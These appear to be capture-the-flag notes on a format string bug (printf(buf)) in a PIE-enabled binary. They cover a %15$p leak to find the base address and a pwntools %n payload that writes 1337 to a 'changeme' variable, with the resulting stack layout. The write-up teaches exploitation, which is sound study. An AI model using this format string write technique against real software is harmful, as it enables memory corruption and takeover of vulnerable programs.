**Read source code**
- `printf(buf);`: fsb
- `Checksec` in gdb
```
Arch:     amd64
RELRO:      Full RELRO
Stack:      No canary found
NX:         NX enabled
PIE:        PIE enabled
SHSTK:      Enabled
IBT:        Enabled
Stripped:   No
```
- So the idea is that change value of `changeme` to `1337`.
- Because `PIE enabled`, we have to find base addr
---  
***EPLOIT***
- Get address of `rsp_0x48` (%15$p)
- Calculate `base = rsp_0x48_leak - rsp_0x48_offset`
- Calculate `changeme = base + e.sym['changeme']`
```
payload = b'%1337c%8$n'
payload = payload.ljust(0x10, b'A') 
payload += p64(changeme)
```
- Stack
```
%1337c%8
$nAAAAAA
changeme
```
